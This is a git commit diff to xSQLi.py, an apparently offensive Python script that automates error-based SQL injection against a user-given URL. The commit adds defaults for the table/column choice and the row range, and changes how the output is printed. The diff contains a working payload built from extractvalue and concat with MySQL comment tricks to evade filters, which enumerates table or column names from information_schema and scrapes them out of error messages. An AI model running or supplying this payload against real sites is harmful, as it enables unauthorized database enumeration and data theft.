0a2ccd9fe0a2d2feadcc730d8a839a91f49f7156
Nirmal Dahal <16473567+TheNittam@users.noreply.github.com>
2018-03-25 22:35:08 +0545

    Update xSQLi.py

--- xSQLi.py
+++ xSQLi.py
@@ -4,16 +4,14 @@
 import re
 import requests
 
-target = input('\n\033[94m Injection Ponit :\033[0m ')
-# post = input('\033[94m POST Parameter  :\033[0m ')
-dump = input('\033[94m (table/column)? :\033[0m ')
-frm = int(input('\033[94m From \t\t :\033[0m '))
-to = int(input('\033[94m To   \t\t :\033[0m '))
+target = input('\n\033[94m Injection Ponit  :\033[0m ')
+dump = input('\033[94m (table/column)?  :\033[0m ') or "table"
+frm = int(input('\033[94m From 	(Def - 0) :\033[0m ') or "0")
+to = int(input('\033[94m To 	(Def - 5) :\033[0m ') or "5")
 
 print("\n\033[1m________________________________________________________________________\033[0m\n")
 
-regex = r"syntax error: [\']?([^\' ]+)"
-
+regex = r"(?<=':)(.*)(?=')"
 payload = " and extractvalue(0x3a,concat/*!(0x3a,(/*!00000SelEcT*/ concat/*!("+dump+"_name)*/ /*!from*/ information_schema./**/"+dump+"s where table_schema=database() limit {},1)))-- -"
 
 for x in range(frm, to):
@@ -21,13 +19,11 @@ for x in range(frm, to):
 	url = target.replace("inject",payload).format(x)
 	response = requests.get(url=url)
 	matches = re.finditer(regex, str(response.text))
-
 	for matchNum, match in enumerate(matches):
 		matchNum = matchNum + 1
-
 		for groupNum in range(0, len(match.groups())):
 			groupNum = groupNum + 1
-			print ("{}) {group}".format(x,group = match.group(groupNum)))
+			print ( str(x)+") {group}".format(group = match.group(groupNum)))
 
 print("________________________________________________________________________")
-print("\n\t\t\tFinished!!!\n")
+print("\n\t\t\tDumped!!!\n")
